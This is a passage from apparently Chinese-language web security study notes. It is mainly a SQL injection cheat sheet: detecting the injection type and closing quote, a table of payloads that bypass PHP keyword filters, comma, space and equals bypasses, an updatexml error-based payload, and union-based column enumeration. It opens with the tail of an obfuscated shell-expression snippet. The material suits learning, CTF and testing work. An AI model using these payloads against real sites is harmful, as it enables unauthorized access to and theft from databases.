punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="sql注入"><a class="anchor" href="#sql注入">#</a> SQL 注入</h1>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111195405967.png" alt="image-20250111195405967" /></p>
<p>这里只需要 <code>'id'</code> （不需要管双引号）</p>
<ul>
<li>and 优先级高于 or</li>
<li>判断有无闭合 and 1=1 and 1=2 // 结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+ 闭合</li>
<li><strong>注释相关</strong>： <code>/*</code> 、 <code>--+</code>  或 <code>--空格</code> 、 <code>#</code>  、 <code>%0c</code> 、 <code>--%01</code> 【如用到 --+ 闭合】【 <code>+</code>  加，可替代空格，如 <code>select+user()</code> 】</li>
</ul>
<h2 id="1判断参数类型"><a class="anchor" href="#1判断参数类型">#</a> 1. 判断参数类型</h2>
<p>先判断是否是整型，如果不是整型则为字符型，字符型存在多种情况，需要使用单引号【'】、双引号【&quot;】、括号【()】多种组合方式进行试探</p>
<ol>
<li>
<p>id=1 and 1=1 回显正常 ，id=1 and1=2 回显错误（判断为 <code>整形</code> ）</p>
<p>【原因：and 1=1 或者 and 1=2 写入了 sql 语句并且执行成功 因为 1=2 不成立所以 id=1 and 1=2 回显是错误的】</p>
</li>
<li>
<p>id=1 and 1=1 和 id=1 and 1=2 回显正常（判断为 <code>字符型</code> ）<strong>【转到 2 判断闭合方式】</strong></p>
</li>
</ol>
<h2 id="2字符型注入判断闭合方式"><a class="anchor" href="#2字符型注入判断闭合方式">#</a> 2. 字符型注入判断闭合方式</h2>
<p>字符型注入可以分为：「单引号字符型」注入和「双引号字符型」注入</p>
<ol>
<li>
<p>id=1' and '1'='1 回显正确 id=1' and '1'='2 回显错误（判断为【'】闭合）</p>
</li>
<li>
<p>id=1&quot;and&quot;1&quot;=&quot;1 回显正常 id=1&quot;and&quot;1&quot;=&quot;2 回显错误（判断为【&quot;】闭合）</p>
</li>
</ol>
<p><strong>以上都不行时尝试：1% df’ 此为宽字节注入</strong></p>
<h3 id="0x0c-常见过滤绕过方法"><a class="anchor" href="#0x0c-常见过滤绕过方法">#</a> 0x0c 常见过滤绕过方法</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>过滤关键字    <span class="token operator">and</span> <span class="token operator">or</span></pre></td></tr><tr><td data-num="2"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or)/i'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="4"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>过滤关键字    <span class="token operator">and</span> <span class="token operator">or</span> <span class="token keyword">union</span></pre></td></tr><tr><td data-num="7"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union)/i'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>会过滤的攻击代码    <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> users</pre></td></tr><tr><td data-num="9"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> userid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'admin'</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>过滤关键字    <span class="token operator">and</span> <span class="token operator">or</span> <span class="token keyword">union</span> <span class="token keyword">where</span></pre></td></tr><tr><td data-num="12"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where)/i'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>过滤关键字    <span class="token operator">and</span> <span class="token operator">or</span> <span class="token keyword">union</span> <span class="token keyword">where</span></pre></td></tr><tr><td data-num="17"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where)/i'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="19"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>过滤关键字    <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span></pre></td></tr><tr><td data-num="22"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where|limit)/i'</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="24"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token comment">#user_id 聚合中 user_id 为 1 的 user 为 admin</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>过滤关键字    <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span></pre></td></tr><tr><td data-num="27"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where|limit|group by)/i'</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="29"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>过滤关键字    <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span></pre></td></tr><tr><td data-num="32"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where|limit|group by|select)/i'</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>gruop_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="34"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>过滤关键字    <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> <span class="token string">'</pre></td></tr><tr><td data-num="37"></td><td><pre>php代码    preg_match('</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">and</span><span class="token operator">|</span><span class="token operator">or</span><span class="token operator">|</span><span class="token keyword">union</span><span class="token operator">|</span><span class="token keyword">where</span><span class="token operator">|</span><span class="token keyword">limit</span><span class="token operator">|</span><span class="token keyword">group</span> <span class="token keyword">by</span><span class="token operator">|</span><span class="token keyword">select</span><span class="token operator">|</span>\'<span class="token punctuation">)</span><span class="token operator">/</span>i<span class="token string">', $id)</pre></td></tr><tr><td data-num="38"></td><td><pre>会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1</pre></td></tr><tr><td data-num="39"></td><td><pre>绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>过滤关键字    and, or, union, where, limit, group by, select, '</span><span class="token punctuation">,</span> hex</pre></td></tr><tr><td data-num="42"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where|limit|group by|select|\'|hex)/i'</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#十进制的 11 转化为十六进制，并小写。</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>过滤关键字    <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> <span class="token string">', hex, substr</pre></td></tr><tr><td data-num="47"></td><td><pre>php代码    preg_match('</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">and</span><span class="token operator">|</span><span class="token operator">or</span><span class="token operator">|</span><span class="token keyword">union</span><span class="token operator">|</span><span class="token keyword">where</span><span class="token operator">|</span><span class="token keyword">limit</span><span class="token operator">|</span><span class="token keyword">group</span> <span class="token keyword">by</span><span class="token operator">|</span><span class="token keyword">select</span><span class="token operator">|</span>\'<span class="token operator">|</span>hex<span class="token operator">|</span>substr<span class="token punctuation">)</span><span class="token operator">/</span>i<span class="token string">', $id)</pre></td></tr><tr><td data-num="48"></td><td><pre>会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td></pre></td></tr><tr><td data-num="49"></td><td><pre>绕过方式    1 &amp;&amp; lpad(user,7,1)</pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre>过滤关键字    and, or, union, where, limit, group by, select, '</span><span class="token punctuation">,</span> hex<span class="token punctuation">,</span> substr<span class="token punctuation">,</span> 空格</pre></td></tr><tr><td data-num="52"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i'</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>td<span class="token operator">></span></pre></td></tr><tr><td data-num="54"></td><td><pre>绕过方式    <span class="token number">1</span><span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">||</span><span class="token operator">%</span><span class="token number">0</span>blpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>过滤关键字    <span class="token operator">and</span> <span class="token operator">or</span> <span class="token keyword">union</span> <span class="token keyword">where</span></pre></td></tr><tr><td data-num="57"></td><td><pre>php代码    preg_match<span class="token punctuation">(</span><span class="token string">'/(and|or|union|where)/i'</span><span class="token punctuation">,</span>$id<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>会过滤的攻击代码    <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="59"></td><td><pre>绕过方式    <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr></table></figure><h2 id="3绕过过滤"><a class="anchor" href="#3绕过过滤">#</a> 3. 绕过过滤</h2>
<h3 id="1绕过关键字过滤"><a class="anchor" href="#1绕过关键字过滤">#</a> 1. 绕过关键字过滤</h3>
<ol>
<li>
<p>就是用 <code>/**/</code> ， <code>&lt;&gt;</code> ，分割关键字 **</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>sel<span class="token operator">&lt;></span>ect</pre></td></tr><tr><td data-num="2"></td><td><pre>sel<span class="token comment">/**/</span>ect</pre></td></tr></table></figure></li>
<li>
<p>根据过滤程度，有时候还可以用双写绕过</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>selselectect <span class="token comment">#sel select ect</span></pre></td></tr></table></figure></li>
<li>
<p>既然是过滤关键字，大小写应该都会被匹配过滤，所以大小写绕过一般是行不通的</p>
</li>
<li>
<p>使用编码绕过</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>url编码绕过</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">16</span>进制编码绕过</pre></td></tr><tr><td data-num="3"></td><td><pre>ASCII编码绕过</pre></td></tr></table></figure></li>
</ol>
<h2 id="2过滤逗号"><a class="anchor" href="#2过滤逗号">#</a> 2. 过滤逗号</h2>
<p>常见的几种注入方法基本上都要使用逗号，要是逗号被过滤了，那就只能想办法绕过了。<br />
绕过方法：</p>
<ol>
<li>
<p>简单注入可以使用 join 方法绕过</p>
<p>原语句：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span></pre></td></tr></table></figure><p>join 语句：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr></table></figure></li>
<li>
<p>对于盲注的那几个函数 substr (),mid (),limit</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>substr和<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>可以使用<span class="token keyword">from</span> <span class="token keyword">for</span>的方法解决</pre></td></tr><tr><td data-num="2"></td><td><pre>substr<span class="token punctuation">(</span>str <span class="token keyword">from</span> pos <span class="token keyword">for</span> len<span class="token punctuation">)</span> <span class="token comment">// 在 str 中从第 pos 位截取 len 长的字符</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">mid</span><span class="token punctuation">(</span>str <span class="token keyword">from</span> pos <span class="token keyword">for</span> len<span class="token punctuation">)</span><span class="token comment">// 在 str 中从第 pos 位截取 len 长的字符</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">limit</span>可以用<span class="token keyword">offset</span>的方法绕过</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="6"></td><td><pre>使用substring函数也可以绕过</pre></td></tr><tr><td data-num="7"></td><td><pre>substring<span class="token punctuation">(</span>str <span class="token keyword">from</span> pos<span class="token punctuation">)</span> <span class="token comment">// 返回字符串 str 的第 pos 个字符，索引从 1 开始</span></pre></td></tr></table></figure></li>
</ol>
<h2 id="3过滤空格"><a class="anchor" href="#3过滤空格">#</a> 3. 过滤空格</h2>
<p>空格被过滤有以下几种方法绕过：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>（<span class="token number">1</span>）双空格 </pre></td></tr><tr><td data-num="2"></td><td><pre>（<span class="token number">2</span>）<span class="token comment">/**/</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>（<span class="token number">3</span>）用括号绕过 </pre></td></tr><tr><td data-num="4"></td><td><pre>（<span class="token number">4</span>）用回车代替 <span class="token comment">//ascii 码为 chr (13)&amp;chr (10)，url 编码为 %0d%0a</span></pre></td></tr></table></figure><h2 id="4过滤等号"><a class="anchor" href="#4过滤等号">#</a> 4. 过滤等号</h2>
<p>如果等号被过滤了我们可以用 like 代替（把 <code>=</code>  替换为 <code>like</code> ）<br />
使用 like 、rlike 、regexp 或者 使用 &lt;或者&gt;</p>
<h4 id="5-过滤大于小于号"><a class="anchor" href="#5-过滤大于小于号">#</a> 5、过滤大于小于号</h4>
<p>盲注中我们经常需要用到比较符，如果他们被过滤了，我们可以用以下几种方法绕过：<br />
（</p>
<figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre>1）<span class="token function">greatest</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>...<span class="token punctuation">)</span>		<span class="token comment">// 返回其中的最大值</span></pre></td></tr><tr><td data-num="2"></td><td><pre>（2）<span class="token function">strcmp</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>		<span class="token comment">// 当 str1=str2，返回 0，当 str1>str2，返回 1，当 str1&lt;str2，返回 - 1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>（3）in 操作符</pre></td></tr><tr><td data-num="4"></td><td><pre>（4）between   <span class="token operator">and</span>		<span class="token comment">// 选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。</span></pre></td></tr></table></figure><h4 id="6等价函数绕过"><a class="anchor" href="#6等价函数绕过">#</a> 6. 等价函数绕过</h4>
<pre><code class="language-pgsql">hex()、bin() ==&gt; ascii() 
sleep() ==&gt;benchmark() 
concat_ws()==&gt;group_concat() 
mid()、substr() ==&gt; substring() 
@@user ==&gt; user() 
@@datadir ==&gt; datadir() 
举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 
或者： substr((select 'password'),1,1) = 0x70 
strcmp(left('password',1), 0x69) = 1 
strcmp(left('password',1), 0x70) = 0 
strcmp(left('password',1), 0x71) = -1
</code></pre>
<h3 id="6根据注入情况使用注入方式"><a class="anchor" href="#6根据注入情况使用注入方式">#</a> 6. 根据注入情况使用注入方式</h3>
<p>使用 id=1 进行尝试尝试 继续使用 order by 查询显示位 union select 1，2，3 查询无显示，即无法得到显示位或无法得到列数时放弃使用联合查询<br />
<strong>尝试使用报错语句</strong></p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,database(),0x7e),1) --+  </pre></td></tr><tr><td data-num="2"></td><td><pre>#'</span><span class="token comment">#等没有报错信息显示时放弃使用【报错注入】</span></pre></td></tr></table></figure><p>尝试使用布尔盲注和时间盲注（建议使用工具进行注入）</p>
<h4 id="联合查询注入"><a class="anchor" href="#联合查询注入">#</a> 联合查询注入</h4>
<p>前提：知道列数且页面上有显示位。<br />
判断显示位、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br />
<strong>判断列数</strong></p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#这里主要是用 `order by 列索引号`,order by 1 有结果，则至少有 1 列 (1 个字段数)，若接着 order by 2 无结果则只有 1 列 (1 个字段数)</span></pre></td></tr></table></figure><p><strong>显示位</strong></p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#这里 select 1，2，3; 如果有三个字段就显示三列，每个字段有几行就显示几行</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">select</span>直接加数字串不指向任何数据库的表，输入的数字是什么就返回什么</pre></td></tr></table></figure><p>&lt;img src=&quot;<span class="exturl" 